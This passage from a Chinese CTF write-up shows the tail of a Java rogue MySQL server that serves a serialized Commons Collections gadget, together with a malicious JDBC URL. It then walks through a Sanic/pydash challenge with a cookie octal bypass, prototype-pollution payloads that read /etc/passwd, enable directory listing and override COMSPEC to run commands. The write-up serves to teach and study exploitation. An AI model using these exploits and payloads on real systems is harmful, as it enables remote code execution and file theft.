                                payloadLength = String.format("%4s", payloadLength).replace(' ', '0');  // 补充0，保持四位长度
                                String payloadLengthHex = payloadLength.substring(2, 4) + payloadLength.substring(0, 2); // 反转顺序

                                // 计算数据包总长度
                                int totalLength = payloadContent.length() / 2 + 4;
                                String dataLen = Integer.toHexString(totalLength);
                                dataLen = String.format("%6s", dataLen).replace(' ', '0'); // 补充0，保持六位长度
                                String dataLenHex = dataLen.substring(4, 6) + dataLen.substring(2, 4) + dataLen.substring(0, 2); // 反转顺序

                                // 构造最终的 MySQL 数据包
                                mysqlDatafinal.append(mysqlData).append(dataLenHex)
                                        .append("04")
                                        .append("fbfc")
                                        .append(payloadLengthHex)
                                        .append(payloadContent)  // 这里应该是 payload 的内容，假设它是一个十六进制字符串
                                        .append("07000005fe000022000100");
                            }
                            String mysqlstring = mysqlDatafinal.toString();
                            sendData(clientSocket, mysqlstring);
                            data = receiveData(clientSocket);
                        }
                        if (data.contains("SHOW WARNINGS")) {
                            String payload = "01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000";
                            sendData(clientSocket, payload);
                        }
                        break;
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Receive data from client
    private static String receiveData(Socket socket) throws IOException {
        byte[] buffer = new byte[4096];
        InputStream inputStream = socket.getInputStream();
        int bytesRead = inputStream.read(buffer);
        String asciiString = new String(Arrays.copyOf(buffer, bytesRead), StandardCharsets.US_ASCII);
        String data =  asciiString;
        System.out.println("[*] Receiving the package: " + data);
        return data;
    }

    // Send data to client
    private static void sendData(Socket socket, String data) throws IOException {
        System.out.println("[*] Sending the package: " + data);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(hexToBytes(data));
        outputStream.flush();
    }

    // Convert byte array to hexadecimal string
    private static String bytesToHex(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            hexString.append(String.format("%02x", b));
        }
        return hexString.toString();
    }

    // Convert hexadecimal string to byte array
    private static byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] bytes = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            bytes[i / 2] = (byte) Integer.parseInt(hex.substring(i, i + 2), 16);
        }
        return bytes;
    }

    // Get payload content from file
    private static String getPayloadContent() {
        File file = new File(PAYLOAD_FILE);
        if (file.exists()) {
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] bytes = new byte[(int) file.length()];
                fis.read(bytes);
                return bytesToHex(bytes);
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("Payload file not found");
        }
        return "aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878";
    }
}
```

这里向日葵外网需要切成TCP通道，http不能建立mysql连接

很怪，我跑这个代码的时候，IDEA运行模式receving缓冲区不够，打开调试想看一下就成功执行了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222174257826.png)

同理，选create view或者直接sql注入去触发

```json
{
"type":"1",
"url":"jdbc:mysql://115.236.153.174:80/a?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
 }
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222174337289.png)



最后试一下postgresql写文件呢？

postgresql只能写string，不能写二进制，直接pass了





## Sanic

/src源码

```python
from sanic import Sanic
from sanic.response import text, html
from sanic_session import Session
import pydash
# pydash==5.1.2


class Pollute:
    def __init__(self):
        pass


app = Sanic(__name__)
app.static("/static/", "./static/")
Session(app)


@app.route('/', methods=['GET', 'POST'])
async def index(request):
    return html(open('static/index.html').read())


@app.route("/login")
async def login(request):
    user = request.cookies.get("user")
    if user.lower() == 'adm;n':
        request.ctx.session['admin'] = True
        return text("login success")

    return text("login fail")


@app.route("/src")
async def src(request):
    return text(open(__file__).read())


@app.route("/admin", methods=['GET', 'POST'])
async def admin(request):
    if request.ctx.session.get('admin') == True:
        key = request.json['key']
        value = request.json['value']
        if key and value and type(key) is str and '_.' not in key:
            pollute = Pollute()
            pydash.set_(pollute, key, value)
            return text("success")
        else:
            return text("forbidden")

    return text("forbidden")


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

简单地看了一下，几个路由的作用分别如下：

* login：从cookie中获取user变量，如果user小写后是`adm;n`则把全局变量admin设为true
* src：高亮当前的`__file__`变量内容
* admin：如果全局变量admin为true，从request.json获取key value并调用`pydash.set_`合并，这里过滤了`_.`

思路也很明确，原型链污染`__file__`变量读文件

### pydash原型链污染

关于pydash的原型链污染：

https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/

https://blog.abdulrah33m.com/prototype-pollution-in-python/

* 魔术方法无法直接被覆盖用于攻击

魔术方法（如 `__str__`、`__repr__` 等）是 Python 中的特殊方法，用于定义类对象的特定行为。当尝试通过输入覆盖这些魔法方法时，攻击者只能将其设置为普通数据（如字符串或整数）。程序稍后尝试调用这些魔法方法时，期望它们是可执行的方法，但由于被覆盖为数据，会导致 `TypeError`。

如：

```python
class MyClass:
    def __str__(self):
        return "Original"

obj = MyClass()
obj.__str__ = "AttackString"  # 攻击者覆盖 __str__

print(str(obj))  # 调用 __str__ 时，程序尝试执行 "AttackString"，但失败
# TypeError: 'str' object is not callable
```

简单说来就是用户输入通常会被程序视为**数据**（字符串、整数等），而不是代码。

但是有一个属性有很大作用，`__class__`指向对象所属的类

比如：

```python
class Employee: pass # 创建一个空类
emp = Employee（）
emp. __class__ . __qualname__ = 'Polluted'
print(emp)
print(Employee)
#> <__main__.Polluted object at 0x0000024765C48250>
#> <class '__main__.Polluted'>
```

而原型链污染通常存在于合并两个或多个对象的方法、或使用JSON设置对象属性中。

如以下合并方法：

```python
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

如果还想污染父类，可以使用`__base__`，该函数指向继承自最近的父类

如果你想问为什么不直接污染所有对象公有的那个类，是因为Python不允许修改Python自己定的不可变类型，如`object`,`str`,`int`,`dict`等等

虽然不能污染内置对象类，但是通过`__globals__`全局变量可以通过实例的任何`已定义`方法访问属性。（但要访问`__globals__`合并函数必须使用`__getiem__`）

比如`__init__`，每个类都自带`__init__`这个类构造函数。而且从前文来说`<实例> .__init__`，`<实例> .__class__. __init__`和`<类> .__init__`都是一样的，指向同一个构造函数

Pydash是JavaScript上多次报告原型污染的Lodash的Python实现。Pydash的`set_`和`set_with`方法都是递归合并函数，可以利用它来污染属性。

唯一的区别是Pydash函数使用点符号，如`((<attribute>|<item>).)*(<attribute>|<item>)`，而不是js污染常用的JSON

通过下面的例子，可以通过`set_()`达成原型链污染

```python
>>> from pydash import set_
>>> class User:
...     def __init__(self):
...         pass
... 
>>> test_str = '12345'
>>> set_(User(),'__class__.__init__.__globals__.test_str','789666')
>>> print(test_str)
789666
```



该文还介绍了在Windows上使用subprocess.Popen执行命令注入

现有如下case，你能控制your payload：

```python
import subprocess, json
class Employee:
    def __init__(self):
        pass
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
emp_info = json.loads('yourpayload') # attacker-controlled value
merge(emp_info, Employee())
subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```

通过查看subprocess.Popen的源代码

shell为TRUE的时候，从os.environ获得ComSpec，然后再格式化字符串拼接

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211161338364.png)

随后执行命令

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211161712116.png)

1. 通过`__init__`获取Employee构造函数，现在我们有了实例的已定义方法，能获取到`__globals__`
2. 通过`__globals__`访问到`subprocess`模块，这个模块在脚本已经import了
3. 如果环境同时也import了os，那可以使用os而不用使用subprocess
4. 覆盖environ的`COMPEC`

payload：

```json
{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}
```

这样在调用subprocess.Popen的时候也会弹出计算器



### 题解

先需要通过cookie传的值为`adm;n`，才能走到`set_()`

cookie中的`;`被视为分隔符，不能直接传

搜索sanic框架的cookies源码，点进sanic/cookies/request.py第一个函数就是`_unquote`，这是一个编码函数

```python
COOKIE_NAME_RESERVED_CHARS = re.compile(
    '[\x00-\x1f\x7f-\xff()<>@,;:\\\\"/[\\]?={} \x09]'
)
OCTAL_PATTERN = re.compile(r"\\[0-3][0-7][0-7]")
QUOTE_PATTERN = re.compile(r"[\\].")


def _unquote(str):  # no cov
    if str is None or len(str) < 2:
        return str
    if str[0] != '"' or str[-1] != '"':
        return str

    str = str[1:-1]

    i = 0
    n = len(str)
    res = []
    while 0 <= i < n:
        o_match = OCTAL_PATTERN.search(str, i)
        q_match = QUOTE_PATTERN.search(str, i)
        if not o_match and not q_match:
            res.append(str[i:])
            break
        # else:
        j = k = -1
        if o_match:
            j = o_match.start(0)
        if q_match:
            k = q_match.start(0)
        if q_match and (not o_match or k < j):
            res.append(str[i:k])
            res.append(str[k + 1])
            i = k + 2
        else:
            res.append(str[i:j])
            res.append(chr(int(str[j + 1 : j + 4], 8)))  # noqa: E203
            i = j + 4
    return "".join(res)
```

挨着看下，

* 输入字符串为None或者长度小于2直接返回；字符串首尾不是双引号直接返回，然后去掉首尾的双引号
* 使用正则表达式OCTAL_PATTERN和QUOTE_PATTERN分别匹配八进制转义字符和普通转义字符。然后是转换并添加到结果字符串

也就是能用`"八进制"`的形式进行绕过，`adm;n`对应的八进制是`\141\144\155\073\156`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211113709434.png)

记住拿session去登录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211162908205.png)

原型链污染处过滤了`_.`，同理，去看pydash解析的源码

挨着看下pydash `set_()`怎么解析的

`set_()`调用了`set_with`，`set_with`接着调用`update_with`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211115402165.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211115450457.png)

`update_with`核心操作就是调用`to_path_tokens`解析path，然后调用base_set

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211120137549.png)

base_set就等同merge操作，合并

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211120402482.png)

那主要就是关注`to_path_tokens`了

```python
def to_path_tokens(value):
    """Parse `value` into :class:`PathToken` objects."""
    if pyd.is_string(value) and ("." in value or "[" in value):
        # Since we can't tell whether a bare number is supposed to be dict key or a list index, we
        # support a special syntax where any string-integer surrounded by brackets is treated as a
        # list index and converted to an integer.
        keys = [
            PathToken(int(key[1:-1]), default_factory=list)
            if RE_PATH_LIST_INDEX.match(key)
            else PathToken(unescape_path_key(key), default_factory=dict)
            for key in filter(None, RE_PATH_KEY_DELIM.split(value))
        ]
    elif pyd.is_string(value) or pyd.is_number(value):
        keys = [PathToken(value, default_factory=dict)]
    elif value is UNSET:
        keys = []
    else:
        keys = value

    return keys
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211121047309.png)

`RE_PATH_KEY_DELIM`如下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211121654234.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211122822948.png)

也就是说，`\\.`这种偶数个斜杠后面加个`.`的，和`.`的功能一样，都是用来分割的

在JSON中，`\\`代表`\`

那用`_\\\\.`就能绕过对`_.`的过滤

原型链污染读文件：

因为漏洞处代码为`pydash.set_(pollute, key, value)`，那直接取pollute的构造函数作为跳板取`__globals__`

```json
{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.__file__","value":"/etc/passwd"}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211200329153.png)

访问/src得到查看文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211163023610.png)

但是不知道flag文件名

跟进一下`app.static`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211163941931.png)

static有个directory_handler

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211164407778.png)

directory_handler为空时，会实例化DirectoryHandler类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211164506606.png)

跟进到DirectoryHandler类

* handle处理请求，如果directory_view不为空，调用_index方法生成目录列表页面
* _index方法调用 _iter_files 方法获取目录下的文件信息，渲染后并返回
* _iter_files 方法遍历目录下的文件，调用 _prepare_file 方法准备文件信息
* _prepare_file 方法获取文件的统计信息，包括修改时间、是否为目录等。

```python
class DirectoryHandler:
    """Serve files from a directory.

    Args:
        uri (str): The URI to serve the files at.
        directory (Path): The directory to serve files from.
        directory_view (bool): Whether to show a directory listing or not.
        index (Optional[Union[str, Sequence[str]]]): The index file(s) to
            serve if the directory is requested. Defaults to None.
    """

    def __init__(
        self,
        uri: str,
        directory: Path,
        directory_view: bool = False,
        index: Optional[Union[str, Sequence[str]]] = None,
    ) -> None:
        if isinstance(index, str):
            index = [index]
        elif index is None:
            index = []
        self.base = uri.strip("/")
        self.directory = directory
        self.directory_view = directory_view
        self.index = tuple(index)

    async def handle(self, request: Request, path: str):
        """Handle the request.

        Args:
            request (Request): The incoming request object.
            path (str): The path to the file to serve.

        Raises:
            NotFound: If the file is not found.
            IsADirectoryError: If the path is a directory and directory_view is False.

        Returns:
            Response: The response object.
        """  # noqa: E501
        current = path.strip("/")[len(self.base) :].strip("/")  # noqa: E203
        for file_name in self.index:
            index_file = self.directory / current / file_name
            if index_file.is_file():
                return await file(index_file)

        if self.directory_view:
            return self._index(
                self.directory / current, path, request.app.debug
            )

        if self.index:
            raise NotFound("File not found")

        raise IsADirectoryError(f"{self.directory.as_posix()} is a directory")

    def _index(self, location: Path, path: str, debug: bool):
        # Remove empty path elements, append slash
        if "//" in path or not path.endswith("/"):
            return redirect(
                "/" + "".join([f"{p}/" for p in path.split("/") if p])
            )

        # Render file browser
        page = DirectoryPage(self._iter_files(location), path, debug)
        return html(page.render())

    def _prepare_file(self, path: Path) -> Dict[str, Union[int, str]]:
        stat = path.stat()
        modified = (
            datetime.fromtimestamp(stat.st_mtime)
            .isoformat()[:19]
            .replace("T", " ")
        )
        is_dir = S_ISDIR(stat.st_mode)
        icon = "📁" if is_dir else "📄"
        file_name = path.name
        if is_dir:
            file_name += "/"
        return {
            "priority": is_dir * -1,
            "file_name": file_name,
            "icon": icon,
            "file_access": modified,
            "file_size": stat.st_size,
        }

    def _iter_files(self, location: Path) -> Iterable[FileInfo]:
        prepared = [self._prepare_file(f) for f in location.iterdir()]
        for item in sorted(prepared, key=itemgetter("priority", "file_name")):
            del item["priority"]
            yield cast(FileInfo, item)
```

那么，列目录只需要把参数directory_view污染为True，directory污染为根目录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211165546557.png)

怎么污染呢？

该框架可以通过`app.router.name_index['xx']`来获取注册的路由

稍微修改一下代码，在本地跑

```python
@app.route('/', methods=['GET', 'POST'])
async def index(request):
    print(app.router.name_index)
    return text("index")
```

得到static路由路径位于`static/<__file_uri__:path>`，对应name_index的索引为`__mp_main__.static`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211170717793.png)

那可以通过`name_index`获取到static路由信息

全局查找用法，那就再BaseRouter.add处打上断点

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211171356062.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211171440073.png)

打上断点，在初始化时就能看到static Route的变量信息

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211171515095.png)

在handler -> keywords -> directory_handler变量中能找到directory和derectory_view变量

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211171620871.png)

但是directory是个WindowsPath对象，它的值是个tuple，虽然tuple与list类似，但是元组(tuple)的元素一旦初始化就不能修改，因此不能直接污染

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211172158088.png)

我们看下parts传进去后还有没有赋值，这段我的环境好像调不了，直接说下结果吧

parts的值最后是给了_parts这个属性，而该属性是个list，可以修改

payload

```JSON
{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view","value": "True"}
{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts","value": ["/"]}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211194729514.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211194939287.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211194934233.png)

于是我又在本机测了一下,windows似乎根本没有这个_parts，能在windows本机复现的真是神人了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211200658882.png)





国赛的最后一道题似乎都是考一个临场查看库代码的能力，比如今年从cookie的`;`解析想到sanic的cookie解析代码；比如23ciscn go_session查看gin Context的代码。这些在wp看起来比较流畅的思路背后都需要大量的代码分析经验。不过前面的题都是现成的payload的拼接。fighting吧

